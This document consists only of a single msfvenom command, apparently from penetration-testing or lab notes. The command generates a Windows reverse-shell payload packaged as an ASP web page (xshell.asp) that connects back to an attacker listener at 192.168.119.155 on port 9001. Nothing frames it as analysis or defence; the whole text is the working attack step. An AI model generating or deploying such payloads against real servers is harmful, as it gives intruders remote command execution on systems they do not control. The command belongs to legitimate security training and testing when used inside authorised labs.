```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.155 LPORT=9001 -f asp -o xshell.asp
```